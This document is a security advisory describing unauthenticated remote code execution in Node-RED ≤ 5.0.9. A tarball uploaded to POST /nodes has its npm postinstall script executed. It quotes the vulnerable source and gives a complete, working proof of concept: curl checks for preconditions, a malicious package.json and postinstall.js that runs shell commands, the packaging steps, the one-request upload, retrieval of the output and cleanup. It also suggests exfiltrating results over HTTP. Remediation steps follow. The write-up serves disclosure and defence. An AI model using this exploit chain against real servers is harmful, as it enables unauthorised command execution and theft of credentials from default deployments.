## Title: Unauthenticated Remote Code Execution in Node-RED ≤ 5.0.9 via POST /nodes Tarball Upload and npm Lifecycle Scripts

**BUG_Author:** PRISMI Lab

**Affected Version:** Node-RED ≤ 5.0.9 (all released versions; the vulnerable code path exists since 0.x, no lower bound)

**Vendor:** [Node-RED (OpenJS Foundation)](https://github.com/node-red/node-red)

**Vulnerability Files:**
- `packages/node_modules/@node-red/editor-api/lib/auth/index.js`
- `packages/node_modules/@node-red/editor-api/lib/admin/index.js`
- `packages/node_modules/@node-red/editor-api/lib/admin/nodes.js`
- `packages/node_modules/@node-red/registry/lib/installer.js`

## Description:

1. **Missing authentication on the palette install API (CWE-306):**
- The administrative route `POST /nodes` (Palette Manager → "Install / Upload module") is protected only by `needsPermission("nodes.write")`. When `settings.js` does not define `adminAuth` — the default state of the official `nodered/node-red` image — the whole permission middleware degrades into a no-op and calls `next()` directly:

```js
// @node-red/editor-api/lib/auth/index.js:61 (3.1.8) / :74 (5.0.9)
function needsPermission(permission) {
    return function(req,res,next) {
        if (settings && settings.adminAuth) {
            return passport.authenticate(['bearer','tokens','anon'],{ session: false })(req,res,function() {
                if (!req.user) { return next(); }
                if (permissions.hasPermission(req.authInfo.scope,permission)) { return next(); }
                log.audit({event: "permission.fail", permissions: permission},req);
                return res.status(401).end();
            });
        } else {
            next();   // no adminAuth configured → every permission is granted
        }
    }
}
```

- This is not "fail-open after a failed login": it is "the permission layer does not exist at all". Every write permission (`flows.write`, `nodes.write`, `settings.write`, `credentials.write`) is lost at the same time.

2. **The tarball upload branch is enabled by default:**
- `POST /nodes` is registered with a `multer` memory-storage middleware whenever two configuration switches are left at their defaults:

```js
// @node-red/editor-api/lib/admin/index.js:62-68
if (!settings.externalModules || !settings.externalModules.palette
    || settings.externalModules.palette.allowInstall !== false) {
    if (!settings.externalModules || !settings.externalModules.palette
        || settings.externalModules.palette.allowUpload !== false) {
        const multer  = require('multer');
        const upload = multer({ storage: multer.memoryStorage() });
        adminApp.post("/nodes", needsPermission("nodes.write"),
                      upload.single("tarball"), nodes.post, apiUtil.errorHandler);
    }
}
```

- A third, separately-named switch exists one layer above in `nodes.js` (`editorTheme.palette.upload`). All three default to enabled, so an anonymous multipart request with a `tarball` field reaches the installer.

3. **The uploaded bytes are passed straight into the installer as a Buffer:**
- The handler copies the raw multipart body into the install options without inspecting it:

```js
// @node-red/editor-api/lib/admin/nodes.js:45
if (req.file) {
    opts.tarball = { name: req.file.originalname, size: req.file.size,
                     buffer: req.file.buffer };   // raw bytes, no validation
}
runtimeAPI.nodes.addModule(opts).then(...)
```

- The registry layer then uses the **argument type** as the routing decision: a `Buffer` means "install from an uploaded tarball", a `String` means "install from the npm registry". Any request that produces `req.file` therefore bypasses the registry name whitelist, version constraints and `installDenyList` entirely:

```js
// @node-red/registry/lib/installer.js:128 (3.1.8) / :138 (5.0.9)
async function installModule(module,version,url) {
    if (Buffer.isBuffer(module)) {
        return installTarball(module)
    }
    ...
}
```

4. **Only one content check exists, and it is trivial to satisfy:**
- `installTarball()` unpacks the archive to a temporary directory, reads `package.json`, and then writes the original bytes to `<userDir>/nodes/<name>-<version>.tgz`. The single validation is performed by `checkModulePath()`, which only requires the `node-red` key to be present:

```js
// @node-red/registry/lib/installer.js:102
if (!pkg['node-red']) {              // an empty object "node-red": {} already passes
    err = new Error("Invalid Node-RED module");
    err.code = 'invalid_module';
    throw err;
}
```

- No check is made on `scripts`, `dependencies`, `bin`, file list, signature, origin, or package-name consistency. A ~700-byte archive passes all checks.

5. **npm executes the package's lifecycle scripts because `--ignore-scripts` is never passed:**
- The install arguments contain hardening flags, but not the one that matters:

```js
// @node-red/registry/lib/installer.js:218
"args": ['--no-audit','--no-update-notifier','--no-fund',
         '--save','--save-prefix=~','--production','--engine-strict']
// ← no --ignore-scripts

// :226
let args = ['install', ...extraArgs, installName];
return exec.run(npmCommand, args, { cwd: installDir }, true)
```

- `--production` (now `--omit=dev`) only skips `devDependencies`; `preinstall` / `install` / `postinstall` of the installed package still run. `--engine-strict` only validates the `engines` field. The result is that the `postinstall` script declared by the uploaded package is executed as a normal OS child process of the Node-RED server.

6. **Impact — arbitrary command execution as the Node-RED process user:**
- Commands run with the privileges of the Node-RED process (`uid=1000(node-red)` in the official image), i.e. full control of the container: reading environment variables (cloud credentials, `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`, DB passwords), reaching cloud metadata endpoints, reading mounted secrets and the flows/credentials store, and pivoting to the internal network.
- The compromise is invisible to flow-based monitoring: no node is added to the workspace, `GET /flows` is unchanged, `flows.json` is not written. Hardening measures aimed at the flow editor (`exec` / `function` node removal, `editorTheme.palette.editable=false`, node-type whitelists, flow-diff detection) do not affect this path, because it goes through the package manager layer instead of the flow runtime layer.
- No outbound internet access is required: the tarball is uploaded locally, so npm never contacts the registry.

7. **Severity:** CVSS 3.1 `9.8` — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`. The only precondition is the default configuration (no `adminAuth`, palette upload not explicitly disabled), which is exactly what the official Docker image ships.

8. **Why this is a distinct entry point from the well-known `POST /flows` chain:**
- `POST /flows` requires `flows.write` and leaves the deployed flow visible in `GET /flows` and on disk in `flows.json`.
- `POST /nodes` requires only `nodes.write`, modifies no flow, and leaves traces only under `<userDir>/node_modules`, `<userDir>/nodes/*.tgz` and the npm logs.
- Disabling the `exec` and `function` nodes, or setting `editorTheme.palette.editable=false`, blocks the `POST /flows` chain but does not block this one.

## Proof of Concept:

1. **Verify the preconditions (read-only, no writes):**

```bash
# (a) adminAuth absent — anonymous read of /flows must return 200
curl -s -o /dev/null -w "%{http_code}\n" "http://<target-ip>:1880/flows"

# (b) palette install/upload not disabled — expect null or {"palette":{"allowUpload":true,"allowInstall":true}}
curl -s "http://<target-ip>:1880/settings" | python -c "import sys,json;print(json.dumps(json.load(sys.stdin).get('externalModules'),indent=1))"
```

- `200` and `null` respectively mean the target is vulnerable.

2. **Create the malicious module** (the top-level `package/` directory is mandatory for the npm tarball layout):

```
poc/
└── package/
    ├── package.json
    └── postinstall.js
```

- `package/package.json` — the `node-red` field is the passport for the only validation step:

```json
{
  "name": "node-red-contrib-poc-nodes",
  "version": "1.0.0",
  "description": "poc",
  "node-red": { "nodes": {} },
  "scripts": { "postinstall": "node postinstall.js" }
}
```

- `package/postinstall.js` — the payload, cross-platform, writes the command output to two locations and never throws (a thrown error would abort `npm install` and return HTTP 500):

```js
const cp = require('child_process'), fs = require('fs'), os = require('os'), path = require('path');
const isWin = process.platform === 'win32';
const cmd = isWin ? 'whoami & hostname' : 'id; hostname; uname -a';
let out = '';
try { out = cp.execSync(cmd, { timeout: 10000 }).toString(); }
catch (e) { out = 'ERR: ' + e.message; }
const body = 'platform=' + process.platform + '\nuid=' + (isWin ? 'n/a' : process.getuid()) +
             '\nhost=' + os.hostname() + '\ncwd=' + process.cwd() +
             '\nt=' + new Date().toISOString() + '\n---\n' + out;
const targets = [ path.join(process.cwd(), 'nr_out.txt'),
                  path.join(isWin ? os.tmpdir() : '/data', '.nr_poc_out') ];
for (const p of targets) { try { fs.writeFileSync(p, body); } catch (e) {} }
console.log('[POC] postinstall executed on ' + os.hostname());
```

3. **Package and verify the archive:**

```bash
tar -czf poc.tgz package
tar -tzf poc.tgz
# package/
# package/package.json
# package/postinstall.js
```

- On Windows, `tar -czf poc.tgz package` must be used **without** a trailing slash (`package/` makes `bsdtar` emit a 30-byte empty archive, which the target then answers with `404 Module not found`).

4. **Upload it unauthenticated — this is the only request the exploit needs:**

```bash
curl -s -i -X POST "http://<target-ip>:1880/nodes" \
     -H "Node-RED-API-Version: v2" \
     -F "tarball=@poc.tgz;type=application/gzip"
```

- Expected response (`200`):

```json
{"name":"node-red-contrib-poc-nodes","version":"1.0.0","local":true,"user":true,
 "path":"/data/node_modules/node-red-contrib-poc-nodes","nodes":[]}
```

- `"user": true` means a user module was installed; `postinstall` has already finished by the time the response is returned, because npm completes the lifecycle phase before `npm install` exits.

5. **Retrieve the command output:**

- The payload writes `/data/.nr_poc_out` (Linux container) and `nr_out.txt` inside the module directory. Either read it back through a temporary `http in` → `function` → `http response` endpoint deployed with the same unauthenticated API, or exfiltrate it over HTTP from inside `postinstall.js`.
- Sample output observed on an official-image container:

```
platform=linux
uid=1000
host=ip-172-16-x-x.<region>.compute.internal
cwd=/data/node_modules/node-red-contrib-poc-nodes
t=2026-11-04T09:26:00.668Z
---
uid=1000(node-red) gid=1000(node-red) groups=1000(node-red)
ip-172-16-x-x.<region>.compute.internal
Linux ip-172-16-x-x.<region>.compute.internal 6.1.189-236.400.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC x86_64 Linux
```

6. **Confirm the execution path (optional, server-side evidence):**

```bash
# npm debug log under <userDir>/.npm/_logs/<timestamp>-debug-0.log
# argv: 'install','--no-audit',...,'--production',...      ← no --ignore-scripts
# info run node-red-contrib-poc-nodes@1.0.0 postinstall ...
```

7. **Clean up (leave no residue):**

```bash
# (a) uninstall the module — returns 204
curl -s -X DELETE "http://<target-ip>:1880/nodes/node-red-contrib-poc-nodes" \
     -H "Node-RED-API-Version: v2"

# (b) remove the uploaded copy: DELETE /nodes does NOT delete it
rm -f <userDir>/nodes/node-red-contrib-poc-nodes-1.0.0.tgz

# (c) remove any evidence file written by the payload
rm -f /data/.nr_poc_out
```

- Note: `DELETE /nodes/<name>` removes `<userDir>/node_modules/<name>` and the dependency entry in `<userDir>/package.json`, but the uploaded `<name>-<version>.tgz` copy stays on disk and must be removed separately. Re-testing the same package name and version requires either a `DELETE` first or an incremented `version`, otherwise the API answers `{"code":"module_already_loaded"}`.

8. **Remediation reference:**
- Enable `adminAuth` in `settings.js` (this is the only measure that closes `/nodes`, `/flows`, `/settings` and `/credentials` at once).
- Disable the palette install/upload paths explicitly, in both layers: `externalModules: { palette: { allowInstall: false, allowUpload: false } }` and `editorTheme: { palette: { editable: false, upload: false } }`.
- Set `npm_config_ignore_scripts=1` in the container environment, or mount `<userDir>/node_modules` and `<userDir>/nodes` read-only.
- Upgrading does not fix the issue: 5.0.9 still contains all four code paths (`else { next(); }`, `upload.single("tarball")`, `Buffer.isBuffer → installTarball`, npm without `--ignore-scripts`); only `--production` was renamed to `--omit=dev`.
